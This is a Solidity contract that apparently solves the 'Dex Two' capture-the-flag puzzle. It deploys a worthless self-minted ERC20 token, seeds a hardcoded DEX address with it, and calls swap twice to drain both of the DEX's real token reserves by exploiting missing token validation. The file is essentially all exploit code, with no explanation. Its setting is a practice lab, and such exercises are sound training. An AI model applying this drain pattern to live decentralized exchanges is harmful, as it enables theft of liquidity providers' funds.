// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IDex{
    function getSwapPrice(address from, address to, uint amount) external view returns(uint);
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
    function swap(address from, address to, uint amount) external;
    function setTokens(address _token1, address _token2) external;
    function addLiquidity(address token_address, uint amount) external;
    function token1() external returns(address);
    function token2() external returns(address);
}


contract DexterTwo is ERC20 {
    address private  _dex = 0xdB7473645da4c5c26defed4C0d20898259A9078A;
    uint initialSupply = 10;
    string name1 = "Dragon BallZ";
    string symbol1 = "DBZ";
    IERC20 public DBZ;

    IDex Dex = IDex(_dex);
    constructor() public ERC20(name1, symbol1) {
        _mint(address(this), initialSupply);
        DBZ= IERC20(address(this));
    }

    function solution() public {
        DBZ.approve(_dex, 10);
        DBZ.transfer(_dex,1);
        Dex.swap(address(this),Dex.token1(),1);
        Dex.swap(address(this),Dex.token2(),2);

    }

}